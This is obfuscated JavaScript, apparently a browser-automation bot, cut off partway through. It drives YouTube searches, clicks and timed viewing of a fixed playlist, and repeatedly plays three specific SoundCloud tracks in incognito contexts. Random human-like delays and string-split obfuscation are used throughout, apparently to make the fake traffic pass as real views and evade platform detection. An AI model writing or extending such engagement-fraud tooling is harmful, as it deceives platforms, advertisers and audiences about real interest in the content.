const V = b,
  U = d,
  T = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x24df * 0x1 + -0xcde + 0x31be))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1a21 + -0x1 * -0x134e + -0x1 * -0x6d3), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x13 * 0xa35 + -0x910c + 0x444d + (0x5d8 + 0x172a + -0xe * -0x21d) * random()) : await standardWaitForNetIdle(f), await wait(0x20df + 0x4 * 0x103 + 0x1163 * -0x1 + (-0x1b54 + 0x466 + 0x8a * 0x73) * random()), 0x11 * -0xa3 + 0x149 + 0x98b;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1cb4 + -0x3d5 + -0x3411 * -0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x2 * 0xc2d + -0xd * 0x266 + 0x3789;
}
async function randomWait() {
  return await wait(0x137c + 0x1aa1 * -0x1 + 0x1aad + (0x25cb + -0x1 * 0x7f + -0x17b * 0xc) * random()), 0x2346 + -0x2139 + 0x4 * -0x83;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x22db + -0x26dc + 0x401, 0x14fd + -0x22e9 + 0xdf3 * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x19bc3 * -0x1 + -0xe16e + 0x300b * 0x1) * getRandomInt(0x1 * 0x2513 + -0xa49 + -0xd64 * 0x2, 0x10ef + -0x483 + -0xc67), h)), -0x17da + -0x5 * -0x253 + 0xc3c;
}

function a() {
  const bk = [
    'JsKZ41uTeg',
    'zhHtCNLtqZrytq',
    'WQddG3X/W4ldKq',
    'p8k8kmkZW6FcMmkuWPVdVty',
    'WQFcHSkmhmknW7ZdNfFdTCoB',
    'CMCVzw4VC2nYAq',
    'zw51C2vYANmUBW',
    'yM85zLrLwhztAq',
    'WPmTddyMrmoUvrxdUq',
    'https://gr',
    'l8k5oe0+WORdHmkKWRdcOG',
    'zwfZEwzVCMSUBW',
    'y29Tp3bHz2u9oq',
    'WOFcLxSEzCkfW7hdMcXv',
    'zmkzW6O8W6xdPcRdV8oSkG',
    'm0TVwKDrAvK2tG',
    'WPfpWOLIW5BdKaKugIG',
    'wmkfiXikW4xdMCkuWOFdUq',
    'ECoZrmkQW7JdMCkAWR7dRtO',
    'nYu4msvcnq',
    'aSkqj1CFW5ZdLmkvW5JcOG',
    'lw1VB21VBY1PBW',
    '1PYettRo-D',
    'uZ94wJvKW7xcQbnf',
    'C3bSAxq',
    'lhpdLYNdJCkCjrmVhG',
    'z2fTzsXIDhmGBG',
    'zgLZCgXHEvvZzq',
    'C3vKAxbHCNLHBa'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = c,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x110a + -0x7db + -0x92f;
    i = i[R(0x18)](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * 0x228e + 0x36e + -0x25fb]['split']('\x20');
    for (let k = -0x149 * 0x11 + 0x5f9 + 0xfe0; k < i['length']; k += -0x1 * 0xbb3 + 0x1859 + -0xca4)
      j += i[k] * h[i[k + (-0x785 + -0x2166 + 0x28ec)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xc14 * 0x1 + -0xe * 0x174 + 0x84a)['map'](l => Array['from'](l['children']))['flat'](0x2574 * -0x1 + -0x2580 + 0x4af5)['map'](l => l['childNodes'][0x220a * 0x1 + 0x20a * -0x3 + -0x1beb]['childNodes'][-0x38b * -0x3 + 0x135f + -0x1e00]['childNodes'][-0x10bf + 0x26b * 0x1 + 0xe55]['childNodes'][-0x1dae + 0x1d25 + 0x89 * 0x1]['childNodes'][0x8a * -0x39 + 0x1 * 0x1013 + -0x10c * -0xe]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xab0 + 0x93 * 0x5 + -0x9a7 * 0x1, -0x1e14 + 0xe * -0x167 + 0x453e)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x430a + -0x5cab * -0x1 + 0x20f7);
  const h = await getMaxTime(f),
    i = Math['min']((0x7f * -0x337 + 0x72b6 * -0x1 + 0x2f55f) * getRandomInt(0x1 * -0x2675 + 0x143d + 0x91d * 0x2, -0x115e + -0x1ae6 + -0xec3 * -0x3), h);
  return await wait(i), 0x9 * -0x377 + 0x17 * 0x176 + 0x6 * -0x67;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x2 * 0x593 + -0x50e + -0x11 * -0xf4]['children'][0x3 * 0x4 + 0x93b * 0x2 + -0x1282]['children'][-0xd7 * -0x3 + -0xfe0 + 0xd5b]['children'][-0x49 * 0x6d + -0x3 * -0xa21 + 0x59 * 0x2]['children'][0x22af + 0x1d6 * 0x5 + -0x2bdd]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1c6 + -0x36e * -0x8 + -0x19a9;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x206a + 0x749 * -0x2 + 0x1 * -0x1174 + (-0x77 * -0x1 + -0xf0 + 0x13 * 0x9) * random()
  }), await wait(-0xa * -0x2ed + -0x202e + 0x4e0 + (-0x7 * 0x3a8 + 0x16ce + 0x3f6) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x6e8 + -0x9d * 0x3 + -0x25 * 0x23]['childNodes'][0x244d + -0x2177 + 0x5 * -0x91]['childNodes'][-0x1 * -0x1438 + -0xfe1 + -0x456 * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * -0x1782 + 0x16c + 0x161b]['childNodes'][-0x11 * 0xef + -0x1f41 + -0x10 * -0x2f2]['childNodes'][0x1ab * -0xa + -0xfb5 * 0x1 + -0x1 * -0x2065]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xe78 + -0x2e6 + 0x115f),
          r = 0xcc1 * 0x2 + -0x5aa * -0x6 + -0x3b7e;
        for (let u = 0x72 + -0xd8 + 0x66; u < q['length']; u += -0x759 + -0x17 * 0x5 + 0x7ce)
          r += q[u] * k[q[u + (-0x146d + -0x1 * -0xe1b + 0x1 * 0x653)]];
        return r;
      }(n);
  });
  await wait((-0x2f05 * 0x1 + -0x1 * -0x6d8b + 0x1 * -0x3ee) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xb14d * 0x1 + -0x638c + 0x1ff39) * getRandomInt(-0x1bb * 0xb + -0x106b + 0x2375, -0x890 + -0x43 * -0x6e + -0x1430), h + (0x16d9 + -0x24be + 0x216d));
  return await wait(i), -0x1bbf * -0x1 + 0xb9b + -0x2759;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x214a + 0xa8d + -0x2bd7), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const S = b;
    log('executed\x20c' + S(0x4, 'wbzV') + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x22d1 + -0x1c6a + 0x4af3 * 0x1 + (-0x3 * 0x7c3 + 0x15b5 + 0x57c) * Math['random']());
    });
  }, -0xe3e + 0x2e74 + -0x4de * 0x1);
  await wait(-0x2 * -0x34876 + -0x6cbaf + 0x137 * 0x3f5);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x70a * -0x17 + -0x1 * 0xdf1 + 0x566b) * getRandomInt(0x900 + 0x50e + -0xe0a, -0x7d9 + -0x1f58 + -0x5e * -0x6b)), clearInterval(h), 0x1045 + 0x17fb + -0x1 * 0x283f;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x13 * -0x5f + 0xceb * -0x1 + -0x2ef * -0x2;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1 * 0x212f + -0x880 + -0x12 * 0x15f;
    await randomWait();
  }
  return -0x24eb * 0x1 + 0x697 + 0x1e55;
}

function fetchRandomSC() {
  return Math['random']() <= -0x217b + -0x5 * -0x97 + 0x1e88 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2135 + -0xc7d + -0x14b8 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x226 * 0x4 + 0x817 + 0x81 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x2 * 0xcd7 + 0xb * 0x2c4 + -0x381a;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2241 * 0x2 + 0x1 * -0x15985 + 0x24dcf * 0x1 + getRandomInt(-0x1ad2 + 0x5119 + 0x451, -0x6 * -0x261f + 0x3c41 + -0xabcb));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1a4d * 0x1 + -0x912 + 0x2360), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x27f * 0x3 + 0x194d + -0x20ca;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x57b * -0x3 + -0x15fe + 0x266f * 0x1, -0x141 * 0x18 + -0x7c * -0x4a + -0x58e)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x77a + 0x107e + -0x134 + floor((0x1f6e + 0x400 + -0x2 * 0xfc3) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2 * 0x831f7cf + 0x19f8528a + 0x55a3bdd8),
          -0x22e60b + 0x1c28 * 0x347 + -0x178a51 * -0x3,
          -0x2351 + 0xd * -0xcbc + 0x148dd,
          -0x1c7b + -0x1e1 + 0x1edc
        ], y = [
          -0x28d * -0x4 + -0x53 * -0x11 + -0x535 * 0x3,
          0x6bb * 0x2 + 0x21f0 + -0x2f56,
          0x4ef + -0x2301 + -0xf0d * -0x2,
          -0x3 * -0xaae + 0x6 * -0x285 + -0x2 * 0x876
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x5e * -0x2c + -0xe * -0x19c + -0x26af)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0xe23 + -0xe3 * -0x21 + -0xb0 * 0x16; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x2 * 0x98f + 0x1491 + -0x35 * 0x7) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2ad * 0xa + -0x6 * 0x3fb + 0xca9 * 0x4] = A[0x1ad7 + 0x961 * 0x1 + -0x1 * 0x2428] = A[0x705 + -0x128f * 0x2 + -0x1 * -0x1e1a] = A[-0x43 * 0x22 + 0x5 * 0x6e2 + -0x1982] = A[0x885 * 0x4 + -0x1635 + 0x84 * -0x17] = A[-0x2ba * -0xd + 0x29e + 0x1306 * -0x2] = A[-0x41d + -0x4 * 0x2e4 + 0xfb2] = A[-0x10f + -0x8f5 * 0x2 + -0x1 * -0x12ff] = A[0x8 * 0x315 + 0x1e5 * 0x11 + 0x979 * -0x6] = A[-0x8d1 + -0x1a4d + 0x2326] = A[-0x1 * 0x1736 + -0x2b * 0x8b + 0x1 * 0x2e98] = A[0x115 * -0x1a + 0x2 * 0xf71 + -0x2b6] = A[-0xf62 + -0xd * 0x147 + 0x2008] = A[0x39 * 0xa7 + 0xb4 + -0x3 * 0xc9d] = A[0x26df + -0x1437 + -0x129b] = A[0x9c7 * -0x2 + 0x454 * -0x8 + 0x363c] = A[0x2201 * -0x1 + -0x193 + 0x3 * 0xbe1] = 0x1d0 * -0x6 + 0x1b78 + -0x1098, this['blocks'] = A) : this['blocks'] = [
                0x168f + 0xc07 * 0x2 + 0x2e9d * -0x1,
                -0x95f * -0x1 + 0x8 * 0x3bc + -0x273f,
                -0x11 * -0x165 + -0x2377 + 0xbc2,
                0x1 * 0x18df + 0x173e * -0x1 + 0x1a1 * -0x1,
                -0xa9 * 0x31 + -0x8dc + -0x4d * -0x89,
                0x25 * -0x9d + 0x2 * 0x8d + 0x1597,
                -0x1f43 + 0x300 + -0x1 * -0x1c43,
                0x1b1 * 0x16 + 0x4cb + -0x2a01 * 0x1,
                0x177c + -0x1 * -0x1f8d + -0x3709,
                -0x2125 + -0x1a4e + 0x3b73,
                0x9b * -0x19 + -0x1 * -0x1a37 + -0xb14,
                0x73c * -0x4 + 0xc * 0xba + 0x1438,
                0x5 * -0x76 + 0x1 * -0x44e + -0x2 * -0x34e,
                0xd49 * -0x1 + 0x83 * 0x1c + -0x10b,
                0xfa8 + 0x1 * 0xff1 + 0x1f99 * -0x1,
                0x19b * 0x7 + -0x57e * -0x1 + -0x1 * 0x10bb,
                -0x713 * 0x1 + -0x247c + 0x2b8f
              ], this['h0'] = 0x4804825a + -0x3111 * -0x163bf + 0x12774704 * -0x2, this['h1'] = 0x2e98751 * -0x46 + 0xab7091e1 + -0x16 * -0xc5fa415, this['h2'] = 0x1 * -0xa5029c1d + 0xe0bda143 + 0x5cffd7d8, this['h3'] = -0x1139 * -0x189da + 0x1ff39bd1 * -0x1 + 0x15a6c4bd, this['h4'] = 0xddf7ab6a + 0x32917 * 0x4f87 + -0x1157d8d9b, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x160a + -0x1 * 0x1612 + 0x2c1c, this['finalized'] = this['hashed'] = 0x6ee * -0x2 + -0x1fd9 + 0x2db5 * 0x1, this['first'] = -0x835 * -0x3 + 0x151f + -0x2dbd;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0xa06 + -0x1296 * 0x1 + 0x1c9c, O = J['length'] || -0x8c + -0x2462 + 0x2 * 0x1277, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1dca + 0x5a1 + -0x4d5 * -0x5, P[0x1 * -0x43c + 0xe3a + -0x9fe] = this['block'], P[0xecc * -0x1 + 0x62c + 0x8b0] = P[-0x12f1 + 0x214f + -0xe5d * 0x1] = P[-0x1fd4 + -0x18 * 0x53 + 0x279e] = P[-0x150 + 0x1dc3 + -0x8c * 0x34] = P[-0x2 * -0x97 + -0x2133 + 0x8b * 0x3b] = P[-0xdb9 + 0x1047 * 0x1 + -0xb * 0x3b] = P[-0x337 + -0x24e9 + 0x2826] = P[-0x1b1 + -0xb * -0x9b + -0x4f1] = P[0x1f03 * 0x1 + 0x1 * -0xfe5 + -0xf16] = P[-0x1fcb + -0x3 * 0x37 + 0x2079] = P[-0x2395 + 0x5 * -0x5c1 + -0x4064 * -0x1] = P[0x51 * -0x2c + 0xa4a + 0x3ad] = P[-0x64b + 0x1 * -0x15d + 0x7b4] = P[-0x116 * 0x8 + 0x235 * -0x3 + 0xf5c] = P[0x25b6 + -0x2 * -0xbbf + 0x3 * -0x1462] = P[0xd * 0x121 + -0x7b * 0x25 + 0x329] = -0x1b5f + 0x209a + 0x53b * -0x1), K) {
                    for (N = this['start']; M < O && N < 0xd * 0x13d + -0x1e8d * 0x1 + 0x1 * 0xeb4; ++M)
                      P[N >> -0x20a9 + 0x37 + 0x2074] |= J[M] << y[-0x2609 + 0x1545 + 0x10c7 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1 * -0xd81 + 0x1e60 + 0x11 * -0x291; ++M)
                      (L = J['charCodeAt'](M)) < 0x2fe * -0x4 + 0x1a70 + -0xdf8 ? P[N >> 0x2bb + -0x1 * 0x1931 + 0x1678 * 0x1] |= L << y[0x14c4 + -0x84d + -0xc74 & N++] : L < -0x134 + -0x1e2b + 0x275f ? (P[N >> 0x9 * -0x33e + 0x26c1 + 0x1 * -0x991] |= (0xada * -0x1 + 0x1 * 0x1261 + -0x6c7 | L >> -0x1 * -0x5dd + -0x2e3 * -0xd + -0x2b5e) << y[0x1050 + -0x7ca * -0x2 + -0x1fe1 & N++], P[N >> -0x840 + -0x879 + 0x10bb] |= (0x16f * -0x11 + -0x1f62 + 0x1 * 0x3841 | 0xa67 * -0x1 + -0xf9 + 0xb9f & L) << y[-0x52f + 0x3e + 0x13d * 0x4 & N++]) : L < -0x194ec + 0xcfc4 + -0x27 * -0xa98 || L >= -0x637 * -0x1d + -0x556 * -0x15 + -0x4449 ? (P[N >> -0x5 * -0x643 + 0x18d6 + -0x805 * 0x7] |= (0x12be + -0x5ed * -0x5 + -0xfd5 * 0x3 | L >> 0x1dcb + -0x1df6 + 0xb * 0x5) << y[-0x3 * -0x7fa + 0x8e2 * -0x1 + -0xf09 * 0x1 & N++], P[N >> -0x1d14 + 0x42 + 0x1cd4] |= (0x250c + -0x1033 + -0x1459 * 0x1 | L >> 0x1 * 0x14c2 + -0xad2 + 0x12 * -0x8d & -0x1b * -0x28 + -0x7d * 0x7 + -0x8e) << y[0x10c * 0x14 + 0x175c + -0x2c49 * 0x1 & N++], P[N >> -0xed3 + 0x2282 + 0x49 * -0x45] |= (0xa0c + 0x323 * -0x9 + -0x1 * -0x12af | 0x2a7 * -0x9 + -0x1 * -0xb9b + -0x1 * -0xc83 & L) << y[0x6 * -0x32d + -0x1853 * 0x1 + 0x2b64 & N++]) : (L = 0x8bb3 + 0xe956 + -0x7509 + ((-0x20ad + 0x31e + -0x6b6 * -0x5 & L) << 0x2315 * -0x1 + -0x29c * 0xb + 0x3fd3 | 0x21e3 * 0x1 + 0x4ee + -0x1169 * 0x2 & J['charCodeAt'](++M)), P[N >> 0x231c + 0x201f + -0x1 * 0x4339] |= (0x11d + -0x4 * -0x7db + 0x1 * -0x1f99 | L >> 0x144 * -0x7 + -0x23b3 + -0x19 * -0x1c9) << y[-0x1ecf + 0x1 * 0xed1 + 0xf1 * 0x11 & N++], P[N >> 0xad2 * 0x1 + -0x1 * -0x1cdf + -0x27af * 0x1] |= (0x3 * 0x9ea + 0x1904 + -0x1 * 0x3642 | L >> 0x7 * -0x1cf + 0x2348 + -0x1693 & 0x1 * -0x2513 + 0x154e + -0xcd * -0x14) << y[-0xf * -0x62 + -0x11f * -0xe + -0x156d & N++], P[N >> 0x75a * 0x5 + 0xe17 + -0x13 * 0x2ad] |= (-0x1915 + -0xf2f + 0x28c4 | L >> -0x813 * 0x1 + -0x2 * -0xa6f + -0xcc5 & 0x576 + -0x102a + -0xaf3 * -0x1) << y[0xd4f + -0x1573 + 0x1 * 0x827 & N++], P[N >> -0x53 * 0x23 + 0x1ea3 + -0x1348] |= (-0x86 * -0x44 + -0x3f2 + 0xa62 * -0x3 | -0x3d * -0x28 + -0xfda + 0x29 * 0x29 & L) << y[0x776 + -0x1 * 0x935 + 0x1c2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x177b + -0x15c0 + 0x2d7b ? (this['block'] = P[0x195 * -0x2 + 0x17 * -0x15a + 0x2250], this['start'] = N - (-0x976 + -0x5a7 * 0x1 + 0xcf * 0x13), this['hash'](), this['hashed'] = -0x20 * -0x108 + -0x1669 + -0xa96) : this['start'] = N;
                }
                return this['bytes'] > 0x27 * -0xaff6039 + -0x1ff3bb653 + 0x4ac235f01 && (this['hBytes'] += this['bytes'] / (-0x30 * -0x3aa07c5 + -0x3f1d4bcc + 0x8f3bd6dc) << -0xca1 + -0x1a93 * -0x1 + -0xdf2, this['bytes'] = this['bytes'] % (-0x394a9aa8 + 0x2a84a001 * -0x4 + 0x1a8225 * 0x123c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1c * -0x72 + 0x2 * 0x419 + -0x14a9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1dc1 + 0x1919 + -0x36ca] = this['block'], J[K >> 0xcd * -0x1f + 0x1 * -0x88a + 0x215f] |= x[0x56 * 0x29 + -0x144 + -0x1c9 * 0x7 & K], this['block'] = J[-0x1eb3 + -0x52 * 0x6d + -0x41ad * -0x1], K >= 0x83f + -0x9ef * 0x1 + 0xf4 * 0x2 && (this['hashed'] || this['hash'](), J[-0x1 * 0x6f3 + 0x19e4 + -0x12f1] = this['block'], J[0x193e + 0x5e + -0x198c] = J[0x10 * -0x1fd + 0x1 * -0xe5d + 0x2e2e] = J[0x843 + 0x24a2 + -0x2ce3] = J[-0x1 * -0x19db + 0x1d7b + -0x3753] = J[0x1e9f + 0x934 + 0x1 * -0x27cf] = J[0x46 + 0x11 * -0xfd + -0x1 * -0x108c] = J[-0x1 * 0x8a4 + -0xef7 + 0x17a1] = J[-0x2025 + -0x1 * -0xf43 + 0x10e9] = J[0x3 * -0x550 + 0x1b37 + -0xb3f] = J[0x811 * -0x4 + 0x18d9 + 0x774] = J[0x2188 + 0x1 * -0x8f5 + 0x1 * -0x1889] = J[0xf1 * -0x1e + -0x137 * 0x5 + 0x225c] = J[0xbea + -0x2 * -0x73b + 0x2 * -0xd2a] = J[0xa52 + -0xdbd * -0x1 + -0x1802] = J[-0xe0e + 0x3 * 0x2de + 0x582] = J[-0x11cd + -0x123 * -0x21 + -0x13a7] = -0x20e7 + 0x1 * 0x120d + 0x76d * 0x2), J[0x13c1 + 0x1f7d + -0x111 * 0x30] = this['hBytes'] << 0x6e1 + 0x1f15 + -0x25f3 | this['bytes'] >>> -0x1 * 0x1651 + -0x340 * -0x7 + -0x52, J[-0xbf6 + 0x21b7 + 0x15b2 * -0x1] = this['bytes'] << -0x4 * -0x259 + 0x1438 + -0x1d99, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1d8d + 0xcb7 + 0x67 * 0x2a; J < 0xb * -0x260 + 0x1 * -0xc9d + -0x1 * -0x270d; ++J)
                K = Q[J - (0x167c + -0xdca + -0x8af)] ^ Q[J - (0x31 * 0xb9 + 0x228e * -0x1 + -0xd3 * 0x1)] ^ Q[J - (0x23bc + 0x1e4c + -0x2 * 0x20fd)] ^ Q[J - (-0xb1 + 0x237e + -0x22bd)], Q[J] = K << -0x25a5 + 0x1 * -0x15fa + 0x3ba0 | K >>> 0x43f * -0x3 + -0x12c1 * -0x2 + -0xc53 * 0x2;
